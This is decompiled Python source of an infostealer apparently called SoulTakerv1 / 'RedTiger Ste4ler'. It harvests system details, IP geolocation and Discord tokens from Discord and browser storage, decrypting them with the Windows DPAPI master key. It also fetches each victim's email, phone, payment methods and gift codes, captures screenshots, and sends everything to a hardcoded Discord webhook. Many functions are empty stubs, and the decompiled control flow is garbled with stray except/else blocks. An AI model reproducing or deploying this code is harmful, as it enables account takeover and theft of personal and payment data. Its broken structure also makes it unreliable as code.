# Decompiled with PyLingual (https://pylingual.io)
# Internal filename: SoulTakerv1.py
# Bytecode version: 3.12.0rc2 (3531)
# Source timestamp: 1970-01-01 00:00:00 UTC (0)

import sys
import os
import socket
import win32api
import requests

def B10ck_K3y():
    return

def Unb10ck_K3y():
    return

def B10ck_T45k_M4n4g3r():
    return

def B10ck_M0u53():
    return

def B10ck_W3b5it3():
    return

def St4rtup():
    return

def Sy5t3m_Inf0():
    return

def Op3n_U53r_Pr0fi13_53tting5():
    return

def Scr33n5h0t():
    return

def C4m3r4_C4ptur3():
    return

def Di5c0rd_T0k3n():
    return

def Di5c0rd_inj3c710n():
    return

def Br0w53r_5t341():
    return

def R0b10x_C00ki3():
    return

def F4k3_3rr0r():
    return

def Sp4m_0p3n_Pr0gr4m():
    return

def Shutd0wn():
    return

def Clear():
    try:
        if sys.platform.startswith('win'):
            os.system('cls')
        else:  # inserted
            if sys.platform.startswith('linux'):
                os.system('clear')
    except:
        return
w3bh00k_ur1 = 'https://discord.com/api/webhooks/1273491065743085690/uhbYksqQskX9prKyCD7fm5C8vFx5pev1MMfsey3-945pbjcbx8p-H9A7V_TQ-AIwTy9I'
website = 'redtiger.shop'
color_embed = 11011333
username_embed = 'RedTiger Ste4ler'
avatar_embed = 'https://cdn.discordapp.com/attachments/1268900329605300234/1273392191234113679/RedTiger-Logo.png?ex=66be7264&is=66bd20e4&hm=1165a5cd1fd68f410e80c07ca00b0e3db24f008251c838d3d0d695d2e777c6bd&'
footer_text = 'RedTiger Ste4ler | https://github.com/loxyteck/RedTiger-Tools'
footer_embed = {'text': footer_text, 'icon_url': avatar_embed}
hostname_pc = socket.gethostname()
except:
    pass  # postinserted
hostname_pc = 'None'
else:  # inserted
    pass  # postinserted
username_pc = os.getlogin()
except:
    pass  # postinserted
username_pc = 'None'
else:  # inserted
    pass  # postinserted
displayname_pc = win32api.GetUserNameEx(win32api.NameDisplay)
except:
    pass  # postinserted
displayname_pc = 'None'
else:  # inserted
    pass  # postinserted
ip_address_public = requests.get('https://api.ipify.org?format=json').json().get('ip', 'None')
except:
    pass  # postinserted
ip_address_public = 'None'
else:  # inserted
    pass  # postinserted
ip_adress_local = socket.gethostbyname(socket.gethostname())
except:
    pass  # postinserted
ip_adress_local = 'None'
else:  # inserted
    pass  # postinserted
try:
    response = requests.get(f'https://{website}/api/ip/ip={ip_address_public}')
    api = response.json()
    country = api.get('country', 'None')
    country_code = api.get('country_code', 'None')
    region = api.get('region', 'None')
    region_code = api.get('region_code', 'None')
    zip_postal = api.get('zip', 'None')
    city = api.get('city', 'None')
    latitude = api.get('latitude', 'None')
    longitude = api.get('longitude', 'None')
    timezone = api.get('timezone', 'None')
    isp = api.get('isp', 'None')
    org = api.get('org', 'None')
    as_number = api.get('as', 'None')
except:
    response = requests.get(f'http://ip-api.com/json/{ip_address_public}')
    api = response.json()
    country = api.get('country', 'None')
    country_code = api.get('countryCode', 'None')
    region = api.get('regionName', 'None')
    region_code = api.get('region', 'None')
    zip_postal = api.get('zip', 'None')
    city = api.get('city', 'None')
    latitude = api.get('lat', 'None')
    longitude = api.get('lon', 'None')
    timezone = api.get('timezone', 'None')
    isp = api.get('isp', 'None')
    org = api.get('org', 'None')
    as_number = api.get('as', 'None')
else:  # inserted
    pass  # postinserted
def Sy5t3m_Inf0():
    import platform, subprocess
    import uuid
    import psutil, GPUtil
    import ctypes
    import win32api
    import string
    import screeninfo
    import requests
    from discord import SyncWebhook, Embed
    sy5t3m_1nf0 = {platform.system()}
    except:
        sy5t3m_1nf0 = 'None'
    else:  # inserted
        pass  # postinserted
    sy5t3m_v3r5i0n_1nf0 = platform.version()
    except:
        sy5t3m_v3r5i0n_1nf0 = 'None'
    else:  # inserted
        pass  # postinserted
    m4c_4ddr355 = ':'.join(['{:02x}'.format(uuid.getnode() >> elements & 255) for elements in range(0, 12, 2)][::(-1)])
    except:
        m4c_4ddr355 = 'None'
    else:  # inserted
        pass  # postinserted
    hw1d = subprocess.check_output('C:\\Windows\\System32\\wbem\\WMIC.exe csproduct get uuid', shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip()
    except:
        hw1d = 'None'
    else:  # inserted
        pass  # postinserted
    r4m_1nf0 = round(psutil.virtual_memory().total / 1073741824, 2)
    except:
        r4m_1nf0 = 'None'
    else:  # inserted
        pass  # postinserted
    cpu_1nf0 = platform.processor()
    except:
        cpu_1nf0 = 'None'
    else:  # inserted
        pass  # postinserted
    cpu_c0r3_1nf0 = psutil.cpu_count(logical=False)
    except:
        cpu_c0r3_1nf0 = 'None'
    else:  # inserted
        pass  # postinserted
    gpu_1nf0 = GPUtil.getGPUs()[0].name if GPUtil.getGPUs() else 'None'
    except:
        gpu_1nf0 = 'None'
    else:  # inserted
        pass  # postinserted
    try:
        drives_info = []
        bitmask = ctypes.windll.kernel32.GetLogicalDrives()
        for letter in string.ascii_uppercase:
            if bitmask & 1:
                drive_path = letter + ':\\'
    except:
        d15k_5t4t5 = 'Drive:  Free:      Total:     Use:       Name:       \nNone    None       None       None       None     \n'
            else:  # inserted
                try:
                    free_bytes = ctypes.c_ulonglong(0)
                    total_bytes = ctypes.c_ulonglong(0)
                    ctypes.windll.kernel32.GetDiskFreeSpaceExW(ctypes.c_wchar_p(drive_path), None, ctypes.pointer(total_bytes), ctypes.pointer(free_bytes))
                    total_space = total_bytes.value
                    free_space = free_bytes.value
                    used_space = total_space - free_space
                    drive_name = win32api.GetVolumeInformation(drive_path)[0]
                    drive = {'drive': drive_path, 'total': total_space, 'free': free_space, 'used': used_space, 'name': drive_name}
                    drives_info.append(drive)
                    except:
                        pass
        else:  # inserted
            bitmask >>= 1
        else:  # inserted
            d15k_5t4t5 = '{:<7} {:<10} {:<10} {:<10} {:<20}\n'.format('Drive:', 'Free:', 'Total:', 'Use:', 'Name:')
            for drive in drives_info:
                use_percent = drive['used'] / drive['total'] * 100
                free_space_gb = '{:.2f}GO'.format(drive['free'] / 1073741824)
                total_space_gb = '{:.2f}GO'.format(drive['total'] / 1073741824)
                use_percent_str = '{:.2f}%'.format(use_percent)
                d15k_5t4t5 += '{:<7} {:<10} {:<10} {:<10} {:<20}'.format(drive['drive'], free_space_gb, total_space_gb, use_percent_str, drive['name'])
                try:
                    def is_portable():
                        try:
                            battery = psutil.sensors_battery()
                            return battery is not None and battery.power_plugged is not None
                        except AttributeError:
                            return False
                        else:  # inserted
                            try:
                                pass  # postinserted
                            pass
                    if is_portable():
                        p14tf0rm_1nf0 = 'Pc Portable'
                    else:  # inserted
                        p14tf0rm_1nf0 = 'Pc Fixed'
    except:
        pass  # postinserted
    p14tf0rm_1nf0 = 'None'
    else:  # inserted
        scr33n_number = len(screeninfo.get_monitors())
    except:
        pass  # postinserted
    scr33n_number = 'None'
    else:  # inserted
        embed = Embed(title=f'System Info `{username_pc} \"{ip_address_public}\"`:', color=color_embed)
        embed.add_field(name=':bust_in_silhouette: User Pc:', value=f'```Hostname    : {hostname_pc}\nUsername    : {username_pc}\nDisplayName : {displayname_pc}```', inline=False)
        embed.add_field(name=':computer: System:', value=f'```Plateform     : {p14tf0rm_1nf0}\nExploitation  : {sy5t3m_1nf0} {sy5t3m_v3r5i0n_1nf0}\nScreen Number : {scr33n_number}\n\nHWID : {hw1d}\nMAC  : {m4c_4ddr355}\nCPU  : {cpu_1nf0}, {cpu_c0r3_1nf0} Core\nGPU  : {gpu_1nf0}\nRAM  : {r4m_1nf0}Go```', inline=False)
        embed.add_field(name=':satellite: Ip:', value=f'```Public : {ip_address_public}\nLocal  : {ip_adress_local}\nIsp    : {isp}\nOrg    : {org}\nAs     : {as_number}```', inline=False)
        embed.add_field(name=':minidisc: Disk:', value=f'```{d15k_5t4t5}```', inline=False)
        embed.add_field(name=':map: Location:', value=f'```Country   : {country} ({country_code})\nRegion    : {region} ({region_code})\nZip       : {zip_postal}\nCity      : {city}\nTimezone  : {timezone}\nLatitude  : {latitude}\nLongitude : {longitude}```', inline=False)
        embed.set_footer(text=footer_text, icon_url=avatar_embed)
        w3bh00k = SyncWebhook.from_url(w3bh00k_ur1)
        w3bh00k.send(embed=embed, username=username_embed, avatar_url=avatar_embed)

def Di5c0rd_T0k3n():
    import os
    import re
    import json
    import base64
    import requests
    from Cryptodome.Cipher import AES
    from Cryptodome.Protocol.KDF import scrypt
    from win32crypt import CryptUnprotectData
    from discord import SyncWebhook, Embed

    def extr4ct_t0k3n5():
        base_url = 'https://discord.com/api/v9/users/@me'
        appdata_local = os.getenv('localappdata')
        appdata_roaming = os.getenv('appdata')
        regexp = '[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{25,110}'
        regexp_enc = 'dQw4w9WgXcQ:[^\\\"]*'
        t0k3n5 = []
        uids = []
        token_info = {}
        paths = {'Discord': appdata_roaming + '\\discord\\Local Storage\\leveldb\\', 'Discord Canary': appdata_roaming + '\\discordcanary\\Local Storage\\leveldb\\', 'Lightcord': appdata_roaming + '\\Lightcord\\Local Storage\\leveldb\\', 'Discord PTB': appdata_roaming + '\\discordptb\\Local Storage\\leveldb\\', 'Opera': appdata_roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\', 'Opera GX': appdata_roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\', 'Amigo': appdata_local + '\\Amigo\\User Data\\Local Storage\\leveldb\\', 'Torch': appdata_local + '\\Torch\\User Data\\Local Storage\\leveldb\\', 'Kometa': appdata_local + '\\Kometa\\User Data\\Local Storage\\leveldb\\', 'Orbitum': appdata_local + '\\Orbitum\\User Data\\Local Storage\\leveldb\\', 'CentBrowser': appdata_local + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\', '7Star': appdata_local + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\', 'Sputnik': appdata_local + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\', 'Vivaldi': appdata_local + 'Vivaldi', '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\': appdata_local + 'Google Chrome SxS', '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\': appdata_local + 'Google Chrome', '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\': appdata_local + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\', 'Google Chrome1': appdata_local + 'Google Chrome1', '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\':
            pass  # postinserted
        for name, path in paths.items():
            if not os.path.exists(path):
                continue
            _d15c0rd = name.replace(' ', '').lower()
            if 'cord' in path:
                if not os.path.exists(appdata_roaming + f'\\{_d15c0rd}\\Local State'):
                    continue
                for file_name in os.listdir(path):
                    if file_name[(-3):] not in ['log', 'ldb']:
                        continue
                    with open(f'{path}\\{file_name}', errors='ignore') as file:
                        for line in file:
                            for y in re.findall(regexp_enc, line.strip()):
                                t0k3n = decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), get_master_key(appdata_roaming + f'\\{_d15c0rd}\\Local State'))
                                if validate_t0k3n(t0k3n, base_url):
                                    uid = requests.get(base_url, headers={'Authorization': t0k3n}).json()['id']
                                    if uid not in uids:
                                        t0k3n5.append(t0k3n)
                                        uids.append(uid)
                                        token_info[t0k3n] = (name, f'{path}\\{file_name}')
            else:  # inserted
                for file_name in os.listdir(path):
                    if file_name[(-3):] not in ['log', 'ldb']:
                        continue
                    with open(f'{path}\\{file_name}', errors='ignore') as file:
                        for line in file:
                            for t0k3n in re.findall(regexp, line.strip()):
                                if validate_t0k3n(t0k3n, base_url):
                                    uid = requests.get(base_url, headers={'Authorization': t0k3n}).json()['id']
                                    if uid not in uids:
                                        t0k3n5.append(t0k3n)
                                        uids.append(uid)
                                        token_info[t0k3n] = (name, f'{path}\\{file_name}')
        if os.path.exists(appdata_roaming + '\\Mozilla\\Firefox\\Profiles'):
            for path, _, files in os.walk(appdata_roaming + '\\Mozilla\\Firefox\\Profiles'):
                for _file in files:
                    if not _file.endswith('.sqlite'):
                        continue
                    with open(f'{path}\\{_file}', errors='ignore') as file:
                        for line in file:
                            for t0k3n in re.findall(regexp, line.strip()):
                                if validate_t0k3n(t0k3n, base_url):
                                    uid = requests.get(base_url, headers={'Authorization': t0k3n}).json()['id']
                                    if uid not in uids:
                                        t0k3n5.append(t0k3n)
                                        uids.append(uid)
                                        token_info[t0k3n] = ('Firefox', f'{path}\\{_file}')
        return (t0k3n5, token_info)

    def validate_t0k3n(t0k3n, base_url):
        return requests.get(base_url, headers={'Authorization': t0k3n}).status_code == 200

    def decrypt_val(buff, master_key):
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        return cipher.decrypt(payload)[:(-16)].decode()

    def get_master_key(path):
        if not os.path.exists(path):
            return
        with open(path, 'r', encoding='utf-8') as f:
            local_state = json.load(f)
        master_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])[5:]
        return CryptUnprotectData(master_key, None, None, None, 0)[1]

    def upload_t0k3n5():
        t0k3n5, token_info = extr4ct_t0k3n5()
        w3bh00k = SyncWebhook.from_url(w3bh00k_ur1)
        if not t0k3n5:
            embed = Embed(title=f'Discord Token `{username_pc} \"{ip_address_public}\"`:', description='No discord tokens found.', color=color_embed)
            embed.set_footer(text=footer_text, icon_url=avatar_embed)
            w3bh00k.send(embed=embed, username=username_embed, avatar_url=avatar_embed)
            return
        for t0k3n_d15c0rd in t0k3n5:
            api = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': t0k3n_d15c0rd}).json()
            u53rn4m3_d15c0rd = api.get('username', 'None') + '#' + api.get('discriminator', 'None')
            d15pl4y_n4m3_d15c0rd = api.get('global_name', 'None')
            us3r_1d_d15c0rd = api.get('id', 'None')
            em4i1_d15c0rd = api.get('email', 'None')
            ph0n3_d15c0rd = api.get('phone', 'None')
            c0untry_d15c0rd = api.get('locale', 'None')
            mf4_d15c0rd = api.get('mfa_enabled', 'None')
            try:
                if api.get('premium_type', 'None') == 0:
                    n1tr0_d15c0rd = 'False'
                else:  # inserted
                    if api.get('premium_type', 'None') == 1:
                        n1tr0_d15c0rd = 'Nitro Classic'
                    else:  # inserted
                        if api.get('premium_type', 'None') == 2:
                            n1tr0_d15c0rd = 'Nitro Boosts'
                        else:  # inserted
                            if api.get('premium_type', 'None') == 3:
                                n1tr0_d15c0rd = 'Nitro Basic'
                            else:  # inserted
                                n1tr0_d15c0rd = 'False'
            except:
                n1tr0_d15c0rd = 'None'
        else:  # inserted
            try:
                av4t4r_ur1_d15c0rd = f"https://cdn.discordapp.com/avatars/{us3r_1d_d15c0rd}/{api['avatar']}.gif" if requests.get(f"https://cdn.discordapp.com/avatars/{us3r_1d_d15c0rd}/{api['avatar']}.gif").status_code == 200 else f"https://cdn.discordapp.com/avatars/{us3r_1d_d15c0rd}/{api['avatar']}.png"
            except:
                av4t4r_ur1_d15c0rd = avatar_embed
        else:  # inserted
            try:
                billing_discord = requests.get('https://discord.com/api/v6/users/@me/billing/payment-sources', headers={'Authorization': t0k3n_d15c0rd}).json()
                if billing_discord:
                    p4ym3nt_m3th0d5_d15c0rd = []
                    for method in billing_discord:
                        if method['type'] == 1:
                            p4ym3nt_m3th0d5_d15c0rd.append('CB')
                        else:  # inserted
                            if method['type'] == 2:
                                p4ym3nt_m3th0d5_d15c0rd.append('Paypal')
                            else:  # inserted
                                p4ym3nt_m3th0d5_d15c0rd.append('Other')
                    p4ym3nt_m3th0d5_d15c0rd = ' / '.join(p4ym3nt_m3th0d5_d15c0rd)
                else:  # inserted
                    p4ym3nt_m3th0d5_d15c0rd = 'None'
            except:
                p4ym3nt_m3th0d5_d15c0rd = 'None'
        else:  # inserted
            try:
                gift_codes = requests.get('https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers={'Authorization': t0k3n_d15c0rd}).json()
                if gift_codes:
                    codes = []
                    for g1ft_c0d35_d15c0rd in gift_codes:
                        name = g1ft_c0d35_d15c0rd['promotion']['outbound_title']
                        g1ft_c0d35_d15c0rd = g1ft_c0d35_d15c0rd['code']
                        data = f'Gift: {name}\nCode: {g1ft_c0d35_d15c0rd}'
                        if len('\n\n'.join(g1ft_c0d35_d15c0rd)) + len(data) >= 1024:
                            break
                        codes.append(data)
                    if len(codes) > 0:
                        g1ft_c0d35_d15c0rd = '\n\n'.join(codes)
                    else:  # inserted
                        g1ft_c0d35_d15c0rd = 'None'
                else:  # inserted
                    g1ft_c0d35_d15c0rd = 'None'
            except:
                g1ft_c0d35_d15c0rd = 'None'
        else:  # inserted
            software_name, path = token_info.get(t0k3n_d15c0rd, ('Unknown Software', 'Unknown location'))
            embed = Embed(title=f'Discord Token `{username_pc} \"{ip_address_public}\"`:', color=color_embed)
            embed.set_thumbnail(url=av4t4r_ur1_d15c0rd)
            embed.add_field(name=':file_folder: Path:', value=f'```{path}```', inline=False)
            embed.add_field(name=':package: Software:', value=f'```{software_name}```', inline=True)
            embed.add_field(name=':bust_in_silhouette: Username:', value=f'```{u53rn4m3_d15c0rd}```', inline=True)
            embed.add_field(name=':bust_in_silhouette: Display Name:', value=f'```{d15pl4y_n4m3_d15c0rd}```', inline=True)
            embed.add_field(name=':robot: Id:', value=f'```{us3r_1d_d15c0rd}```', inline=True)
            embed.add_field(name=':e_mail: Email:', value=f'```{em4i1_d15c0rd}```', inline=True)
            embed.add_field(name=':telephone_receiver: Phone:', value=f'```{ph0n3_d15c0rd}```', inline=True)
            embed.add_field(name=':globe_with_meridians: Token:', value=f'```{t0k3n_d15c0rd}```', inline=True)
            embed.add_field(name=':rocket: Nitro:', value=f'```{n1tr0_d15c0rd}```', inline=True)
            embed.add_field(name=':earth_africa: Language:', value=f'```{c0untry_d15c0rd}```', inline=True)
            embed.add_field(name=':moneybag: Billing:', value=f'```{p4ym3nt_m3th0d5_d15c0rd}```', inline=True)
            embed.add_field(name=':gift: Gift Code:', value=f'```{g1ft_c0d35_d15c0rd}```', inline=True)
            embed.add_field(name=':lock: Multi-Factor Authentication:', value=f'```{mf4_d15c0rd}```', inline=True)
            embed.set_footer(text=footer_text, icon_url=avatar_embed)
            w3bh00k.send(embed=embed, username=username_embed, avatar_url=avatar_embed)
    upload_t0k3n5()

def Op3n_U53r_Pr0fi13_53tting5():
    import subprocess
    import time
    try:
        subprocess.Popen(['control', 'userpasswords2'])
        time.sleep(2)
    except:
        return

def Scr33n5h0t():
    import os
    from PIL import ImageGrab
    from discord import SyncWebhook, Embed, File
    try:
        name_file_screen = f'Screenshot_{username_pc}.png'

        def capture(path):
            image = ImageGrab.grab(bbox=None, include_layered_windows=False, all_screens=True, xdisplay=None)
            image.save(path)
    except:
        pass  # postinserted
    return
    else:  # inserted
        try:
            path_file_screen = f"{os.path.join(os.environ.get('USERPROFILE'), 'Documents')}\\{name_file_screen}"
            capture(path_file_screen)
        except:
            path_file_screen = name_file_screen
            capture(path_file_screen)
        else:  # inserted
            embed = Embed(title=f'Screenshot `{username_pc} \"{ip_address_public}\"`:', color=color_embed)
            embed.set_image(url=f'attachment://{name_file_screen}')
            embed.set_footer(text=footer_text, icon_url=avatar_embed)
            w3bh00k = SyncWebhook.from_url(w3bh00k_ur1)
            w3bh00k.send(embed=embed, file=File(f'{path_file_screen}', filename=name_file_screen), username=username_embed, avatar_url=avatar_embed)
            if os.path.exists(path_file_screen):
                os.remove(path_file_screen)
payload = {'content': '****╔═════════════════Victim Affected═════════════════╗****', 'username': username_embed, 'avatar_url': avatar_embed}
requests.post(w3bh00k_ur1, json=payload)
B10ck_K3y()
except:
    pass  # postinserted
pass
else:  # inserted
    pass  # postinserted
B10ck_T45k_M4n4g3r()
except:
    pass  # postinserted
pass
else:  # inserted
    pass  # postinserted
B10ck_W3b5it3()
except:
    pass  # postinserted
pass
else:  # inserted
    pass  # postinserted
St4rtup()
except:
    pass  # postinserted
pass
else:  # inserted
    pass  # postinserted
Sy5t3m_Inf0()
except:
    pass  # postinserted
pass
else:  # inserted
    pass  # postinserted
Di5c0rd_T0k3n()
except:
    pass  # postinserted
pass
else:  # inserted
    pass  # postinserted
Di5c0rd_inj3c710n()
except:
    pass  # postinserted
pass
else:  # inserted
    pass  # postinserted
Br0w53r_5t341()
except:
    pass  # postinserted
pass
else:  # inserted
    pass  # postinserted
R0b10x_C00ki3()
except:
    pass  # postinserted
pass
else:  # inserted
    pass  # postinserted
C4m3r4_C4ptur3()
except:
    pass  # postinserted
pass
else:  # inserted
    pass  # postinserted
Op3n_U53r_Pr0fi13_53tting5()
except:
    pass  # postinserted
pass
else:  # inserted
    pass  # postinserted
Scr33n5h0t()
except:
    pass  # postinserted
pass
else:  # inserted
    pass  # postinserted
payload = {'content': f'****╚══════════════════{ip_address_public}══════════════════╝****', 'username': username_embed, 'avatar_url': avatar_embed}
requests.post(w3bh00k_ur1, json=payload)
F4k3_3rr0r()
except:
    pass  # postinserted
pass
else:  # inserted
    pass  # postinserted
Shutd0wn()
except:
    pass  # postinserted
pass
else:  # inserted
    pass  # postinserted
Sp4m_0p3n_Pr0gr4m()
except:
    pass  # postinserted
pass
else:  # inserted
    pass  # postinserted
B10ck_M0u53()
except:
    pass  # postinserted
pass
else:  # inserted
    pass  # postinserted
Clear()